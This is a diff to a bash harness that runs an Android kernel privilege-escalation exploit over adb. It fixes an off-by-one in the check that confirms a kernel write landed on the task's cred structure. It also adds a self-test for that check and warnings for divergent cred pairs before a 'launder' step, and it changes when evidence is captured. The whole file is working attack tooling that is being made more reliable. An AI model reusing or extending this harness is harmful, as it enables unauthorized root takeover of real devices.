@@ -118,17 +118,63 @@ now_ms() { local v; v=$(date +%s%3N 2>/dev/null); case "$v" in ''|*[!0-9]*) date
 #     the launder gate catch the "both landed, different pages" row after all.
 #   * ⚠ the stamp lives at cred+8, so it MUST be read BEFORE step 7's repair.
 #     The repair zeroes cred+8 and erases the evidence (notes.md §11's
-#     `t5_repair.txt`: before repair the third field reads 4294967176; after a
+#     `t5_repair.txt`: before repair the 4th awk field reads 4294967176; after a
 #     successful repair it reads 0).
-stamp_ok() {   # $1=pid $2=write_target -> 0 if the stamp is visible in /proc/status
+# ⛔ FIELD INDEXING — this is the off-by-one that silently killed the whole chain.
+# `uid_line` prints the whole line including its label:  `Uid: 0 0 4294967176 0`.
+# awk's $1 is therefore the LABEL "Uid:", and the four id values are $2..$5:
+#       $2=uid(real)   $3=euid   $4=suid   $5=fsuid
+# The stamp is the side effect's 8-byte store at cred+8, i.e. gid (low32) and
+# suid (hi32), so it lands in Gid's $2 and Uid's $4.  notes.md §11 calls the same
+# location "the third field of the Uid: line" — counting VALUES, not awk fields —
+# and that wording is where the miscount came from.  Using $3 reads euid, which
+# is 0 on the fake cred and can never equal hi32(write_target): the criterion then
+# reports "no stamp" for a shot that landed, and because "no stamp" is ALSO the
+# normal result of a genuine miss, nothing anywhere raises an error.  It gates
+# off step 6 and the launder gate and looks like bad luck.
+#   ⇒ Factored out so stamp_selftest() exercises the SAME code path the gate
+#     uses.  A self-test that re-implements the check proves nothing.
+uid_suid_field() { printf '%s' "$1" | awk '{print $4}'; }   # 4th awk field == suid
+gid_gid_field()  { printf '%s' "$1" | awk '{print $2}'; }   # 2nd awk field == gid
+
+# THREE states, because "cannot read" is not "no stamp".  Collapsing those two is
+# the same error as run 13's blank probe_state (铁律 8) and it cost this project a
+# reboot's worth of evidence.
+#   0 = stamp PRESENT   (Uid $4 == hi32(wt)  AND  Gid $2 == lo32(wt))
+#   1 = NO stamp        (both lines readable, values disagree)
+#   2 = UNREADABLE      (empty read — device gone, or /proc blocked)
+stamp_ok() {   # $1=pid $2=write_target
     local pid=$1 wt=$2 u g hi lo
-    [ -n "$wt" ] || return 1
+    [ -n "$wt" ] || return 2
     hi=$(( wt >> 32 & 0xffffffff )); lo=$(( wt & 0xffffffff ))
     u=$(uid_line "$pid"); g=$(gid_line "$pid")
-    # "Uid: <real> <eff> <saved> <fs>" -> field 3 is suid
-    [ "$(printf '%s' "$u" | awk '{print $3}')" = "$hi" ] || return 1
-    # "Gid: <real> <eff> <saved> <fs>" -> field 2 is gid
-    [ "$(printf '%s' "$g" | awk '{print $2}')" = "$lo" ] || return 1
+    [ -n "$u" ] && [ -n "$g" ] || return 2
+    [ "$(uid_suid_field "$u")" = "$hi" ] || return 1
+    [ "$(gid_gid_field "$g")" = "$lo" ] || return 1
+    return 0
+}
+
+# ★ A criterion that has never been run against a known-POSITIVE sample is not a
+# criterion, it is a guess — and when it is wrong it fails SILENTLY, because its
+# failure mode ("did not land") is also the normal outcome of a real miss.  That
+# is exactly how probe_state, `dmesg -w`, the empty klog and the blank readback
+# each went wrong.  This self-test is the only thing that breaks that loop, so it
+# runs before any shot and exits on failure.
+# Samples are the REAL measured values: out/t5_w7_778.txt /
+# evidence/notes.md §11, write_target = 0xffffff8800cdd178.
+stamp_selftest() {
+    local wt=0xffffff8800cdd178 hi lo
+    hi=$(( wt >> 32 & 0xffffffff )); lo=$(( wt & 0xffffffff ))
+    # positive: the exact lines the device produced
+    [ "$(uid_suid_field 'Uid: 0 0 4294967176 0')" = "$hi" ] || return 1
+    [ "$(gid_gid_field "Gid: $lo 0 0 0")"        = "$lo" ] || return 1
+    # negative: a plain unprivileged process must NOT look stamped
+    [ "$(uid_suid_field 'Uid: 2000 2000 2000 2000')" = "$hi" ] && return 1
+    [ "$(gid_gid_field 'Gid: 2000 2000 2000 2000')"  = "$lo" ] && return 1
+    [ "$(uid_suid_field 'Uid: 0 0 0 0')" = "$hi" ] && return 1
+    [ "$(gid_gid_field 'Gid: 0 0 0 0')"  = "$lo" ] && return 1
+    # unreadable must not masquerade as a stamp
+    [ "$(uid_suid_field '')" = "$hi" ] && return 1
     return 0
 }
 alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
@@ -203,6 +249,21 @@ stop_klog() { [ -n "$POLLPID" ] && kill "$POLLPID" 2>/dev/null; POLLPID=""; }
 
 # ---------------------------------------------------------------- preflight
 say "=== preflight ==="
+# ★ Host-side self-test of the landing criterion, BEFORE anything touches the
+# device.  A broken criterion does not announce itself — it reports "did not
+# land", which is indistinguishable from a real miss, so the whole run would
+# quietly do nothing and the operator would go hunting for a hit-rate problem.
+# This costs nothing and it is the only thing that breaks that loop.
+if stamp_selftest; then
+    say "  stamp_selftest: OK  (positive 0xffffff8800cdd178 -> Uid \$4=4294967176,"
+    say "                        Gid \$2=13488504; negative + unreadable rejected)"
+else
+    say "  !! FATAL: stamp_selftest FAILED.  The 0x778 landing criterion is broken."
+    say "     Refusing to run: every shot would report 'no stamp' regardless of what"
+    say "     actually landed, step 6 would never fire, and the launder gate would"
+    say "     refuse forever.  Fix uid_suid_field/gid_gid_field first."
+    exit 9
+fi
 "$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
 A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
     | tee "$OUT/00_preflight.txt" | tr -d '\r'
@@ -355,7 +416,7 @@ poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 200
 # because adb is the contended resource and the shot is what we are timing.
 shot() {
     local off=$1 extra=$2 tag=$3
-    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
+    local ev="$DEV/bootA_ev_${TAG}_$tag.txt" eff_off
     A "rm -f $ev 2>/dev/null; true"
     stop_klog
     say "  [$tag] ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s nodrain=$NODRAIN ${extra:-}"
@@ -406,12 +467,25 @@ shot() {
     SHOT_STATUS=$(uid_line "$CPID")
     SHOT_WT=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
     say "  [$tag] victim readback NOW: [$SHOT_STATUS]"
-    # Only meaningful when the target really is task+0x778; with MIMIC_W1 (or any
-    # EXTRA that swaps the target) the prediction would be about a cred nothing
-    # wrote to.
-    case "$EXTRA$extra" in
-      *MIMIC*|*V12_W7_VALUE*) SKIP_PRED=1;;
-      *) SKIP_PRED=0;;
+    # SKIP_PRED: is the target really task+0x778?  The prediction below is only
+    # meaningful then, and it is the only line that says what the readback SHOULD
+    # look like.  Decide it from the TARGET, not from whether the literal string
+    # V12_W7_VALUE appears in the args: step 6 legitimately passes V12_W7_VALUE as
+    # its $extra, so keying on the string suppresses step 5's prediction for any
+    # operator who used EXTRA to pin a value -- losing the prediction in exactly
+    # the experiment that most needs it.
+    # Target = task + V12_W7_OFF (last assignment wins, since EXTRA/$extra are
+    # appended after the runner's own env), unless MIMIC_W1 replaces it with a global.
+    eff_off="$off"
+    for tok in ${EXTRA:-} ${extra:-}; do
+        case "$tok" in V12_W7_OFF=*) eff_off="${tok#V12_W7_OFF=}";; esac
+    done
+    case "${EXTRA:-} ${extra:-}" in
+      *MIMIC*) SKIP_PRED=1;;                        # target swapped to a global
+      *)  case "$eff_off" in
+            0x778) SKIP_PRED=0;;
+            *)     SKIP_PRED=1;;                    # target is not task+0x778
+          esac;;
     esac
     if [ -n "$SHOT_WT" ] && [ "${off}" = "0x778" ] && [ "$SKIP_PRED" = 0 ]; then
         hi=$(( SHOT_WT >> 32 & 0xffffffff )); lo=$(( SHOT_WT & 0xffffffff ))
@@ -426,7 +500,7 @@ shot() {
 
 # up to $4 shots at one offset; no kill; stop as soon as the readback moves
 shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
-    local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u
+    local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u rc=0
     for r in $(seq 1 "$rounds"); do
         shot "$off" "$extra" "${tag}r$r"
         if ! alive; then say "  !! DEVICE GONE after $tag round $r"; exit 5; fi
@@ -440,13 +514,32 @@ shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
         # 0x778 instead of burning a boot: the stamp is a positive, readable
         # signal, so a failed round is distinguishable from a landed one.
         if [ "${off}" = "0x778" ] && [ "${SKIP_PRED:-0}" = 0 ]; then
-            if stamp_ok "$CPID" "${SHOT_WT:-}"; then
-                say "  [$tag] round $r: STAMP PRESENT — 0x778 LANDED"
-                say "        Uid 3rd field = $(( SHOT_WT >> 32 & 0xffffffff )) (= hi32 write_target)"
-                say "        Gid 1st field = $(( SHOT_WT & 0xffffffff )) (= lo32 write_target)"
-                return 0
-            fi
-            say "  [$tag] round $r/$rounds: no stamp yet  (probe_state=${SHOT_PS:-?} — NOT the criterion)"
+            stamp_ok "$CPID" "${SHOT_WT:-}"; rc=$?
+            case $rc in
+            0)  say "  [$tag] round $r: STAMP PRESENT — 0x778 LANDED"
+                say "        Uid 4th field = $(( SHOT_WT >> 32 & 0xffffffff )) (= hi32 write_target)"
+                say "        Gid 2nd field = $(( SHOT_WT & 0xffffffff )) (= lo32 write_target)"
+                return 0;;
+            2)  say "  ⛔ [$tag] round $r: /proc/status UNREADABLE — landing UNKNOWN."
+                say "     This is NOT 'did not land'.  Device gone, or /proc blocked."
+                say "     (run 13 was read as 'no change' from exactly this shape — 铁律 8)"
+                alive || say "  !! DEVICE GONE during the criterion read"
+                return 1;;
+            *)  # rc=1: readable and no stamp.  A genuine miss and a BROKEN CRITERION
+                # look identical from here — which is precisely why stamp_selftest
+                # runs before any shot.  If probe_state disagrees, say so loudly and
+                # do not let it be read as a miss: the two verdicts send the operator
+                # to completely different places.
+                if [ "${SHOT_PS:-}" = "D" ]; then
+                    say "  ⛔ [$tag] round $r: ORACLE INCONSISTENT."
+                    say "     probe_state=D says the write LANDED; the stamp says it did not."
+                    say "     They cannot both be right.  Go check the CRITERION — field"
+                    say "     indexing, whether the store really lands at cred+8 — NOT the"
+                    say "     hit rate.  Reading this as a miss is the trap."
+                else
+                    say "  [$tag] round $r/$rounds: no stamp  (probe_state=${SHOT_PS:-?} — NOT the criterion)"
+                fi;;
+            esac
         elif [ "${SHOT_PS:-}" = "D" ]; then
             say "  [$tag] probe_state=D on round $r — the write landed"
             say "        (probe_state is the only oracle available for this offset; for"
@@ -501,6 +594,14 @@ if [ "$CONTROL" = "1" ]; then
     say "  [same-value] step 6 will reuse the init_cred image (cell-2 reproduction)"
 else
     if shot_until 0x778 "" w778 "$ROUNDS"; then W778_LANDED=1; fi
+    # ⚠ INVARIANT, do not break it silently: `tail -1` takes the LAST round's
+    # write_value, which equals "the round that SUCCEEDED" only because
+    # shot_until returns the moment the stamp appears (so a success is always the
+    # final round).  If ROUNDS is ever changed to run to completion — or
+    # shot_until stops returning early — this silently picks up a FAILED round's
+    # value and step 6 then writes a different page while every log line still
+    # says "same value".  Any such change must select the successful round
+    # explicitly instead.
     V778="V12_W7_VALUE=$(sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' \
             "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)"
     case "$V778" in
@@ -521,20 +622,31 @@ G778=$(gid_line "$CPID")
 say "  after 0x778: [$U778] / [$G778]"
 # ★ 断言，不是故事：0x778 落地必须能从 /proc/status 看到那枚戳。
 # 而且必须在 step 7 的 repair 之前读 —— repair 把 cred+8 清零，证据就没了
-# (notes.md §11 的 t5_repair.txt：repair 前第三字段 = 4294967176，成功后 = 0)。
+# (notes.md §11 的 t5_repair.txt：repair 前第 4 个 awk 字段 = 4294967176，成功后 = 0)。
+# ⚠ 这段曾经位于 `W778_LANDED = 1` 这个由 $3 差一错误挡住、**永远不可达**的分支里 ——
+#   断言写在了只有判据正确时才会执行的位置，等于没写。判据修好后它才真正跑起来。
+STAMP_VERIFIED=0
 if [ "$W778_LANDED" = "1" ]; then
     WT778=$(sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$OUT"/w7_w778*.txt 2>/dev/null | tail -1)
-    if stamp_ok "$CPID" "$WT778"; then
-        say "  [stamp] ASSERTION HOLDS: Uid 3rd = $(( WT778 >> 32 & 0xffffffff )), Gid 1st = $(( WT778 & 0xffffffff ))"
-    else
-        say "  ⚠ [stamp] ASSERTION FAILED: the stamp criterion said landed, the"
-        say "    readback disagrees. The stamp model or the side-effect offset is wrong"
-        say "    for this path (notes.md §11 measured +8; +0x10 would stamp sgid/euid)."
-        say "    ⛔ Do NOT launder on this run."
-    fi
+    stamp_ok "$CPID" "$WT778"; rc=$?
+    case $rc in
+    0)  say "  [stamp] ASSERTION HOLDS: Uid \$4 = $(( WT778 >> 32 & 0xffffffff )), Gid \$2 = $(( WT778 & 0xffffffff ))"
+        STAMP_VERIFIED=1;;
+    2)  say "  ⛔ [stamp] UNREADABLE at assertion time — landing UNKNOWN, not 'no'."
+        say "     (device gone?) Do not launder on this run.";;
+    *)  say "  ⚠ [stamp] ASSERTION FAILED: the criterion said landed earlier, the"
+        say "    readback disagrees NOW. The stamp model or the side-effect offset is"
+        say "    wrong for this path (notes.md §11 measured +8; +0x10 would stamp"
+        say "    sgid/euid). ⛔ Do NOT launder on this run.";;
+    esac
 else
-    say "  [stamp] no stamp — 0x778 did not land. probe_state was ${SHOT_PS:-?},"
-    say "          which is NOT the criterion."
+    if [ "${SHOT_PS:-}" = "D" ]; then
+        say "  ⛔ [stamp] ORACLE INCONSISTENT: no stamp, but probe_state=D.  Go check"
+        say "     the CRITERION before concluding the shot missed."
+    else
+        say "  [stamp] no stamp — 0x778 did not land. probe_state was ${SHOT_PS:-?},"
+        say "          which is NOT the criterion."
+    fi
 fi
 
 say "=== step 6: 0x780 shot(s) (cred) ==="
@@ -563,7 +675,19 @@ if [ -n "$CRED" ]; then
     # ★ 一次 boot 只修一个页。SAME_VALUE=1 时两枪同值 ⇒ 只有一张页被装上，一次
     # repair 就够。若两枪值不同，两张页的 +8 都会被清零 ⇒ 那枚戳（gid/suid）被
     # 抹掉 ⇒ 内容层会变成"一致"，假一致就真的过关了。所以这里断言两者相等。
-    if [ "${SAME_VALUE:-1}" != "0" ] && [ -n "$V5" ] && [ "$CRED" != "$V5" ]; then
+    if [ "${SAME_VALUE:-1}" != "0" ] && [ -z "$V5" ]; then
+        # ⛔ The case the old check could not see.  It required [ -n "$V5" ] to warn
+        # at all, so it stayed silent precisely when the news was worst: step 6
+        # landed a page and step 5 never did, i.e. a LONE 0x780 write.  real_cred
+        # still points at the original cred while cred points at a sprayed page --
+        # a divergent pair, a latent hard BUG_ON, and it buys nothing.  Empty V5 is
+        # not "no news", it is the worst news.
+        say "  ⛔ WORSE CASE: step 6 landed a page but step 5 never landed (step5=none)."
+        say "     A LONE 0x780 write: real_cred != cred -- a divergent pair and a"
+        say "     latent hard BUG_ON, with no upside.  Repairing here clears cred+8 of"
+        say "     a page the task does point at, so do it only to tidy the stamp, and"
+        say "     ⛔ do NOT launder on this run."
+    elif [ "${SAME_VALUE:-1}" != "0" ] && [ "$CRED" != "$V5" ]; then
         say "  ⚠ step 6 wrote a DIFFERENT page than step 5 (step6=$CRED step5=$V5)."
         say "    The same-value guarantee did NOT hold.  Do not repair both pages:"
         say "    zeroing cred+8 on both would erase the gid/suid stamp and manufacture"
@@ -600,6 +724,17 @@ fi
 
 say "=== step 8: poke LT parent (BEFORE the verdict, so its own report counts) ==="
 [ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
+# ★ cred.stream starts HERE, not after step 9's watch.
+# The poke releases the child into its NO_EXEC report loop, which is
+# 240 x 0.5 s = 120 s and then _exit(0) (exploit.c: "LT child NO-EXEC mode
+# done (120s)").  The old placement was after the watch — WATCH=120 default,
+# i.e. t+~135 s including the report wait — by which time the child is already
+# gone, so the instrument captured nothing at exactly the window it exists for
+# (the first seconds after the landing).  uid.stream was already started before
+# the shots; this makes the two symmetric: both streams are up before the thing
+# they measure begins.
+say "  starting cred.stream on $RES (before the verdict, so it covers the poke window)"
+cred_stream_start "$OUT/cred.stream"
 for i in $(seq 1 15); do
     sleep 1
     R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
@@ -624,9 +759,7 @@ for i in $(seq 5 5 "$WATCH"); do
     say "  t+${i}s up=$UP services=$(svc_count)/5"
 done
 
-say "  starting cred.stream on $RES"
-cred_stream_start "$OUT/cred.stream"
-sleep 3
+say "  cred.stream started at the poke (see step 8) — stopping streams now"
 streams_stop
 say "=== step 10: evidence ==="
 stop_klog
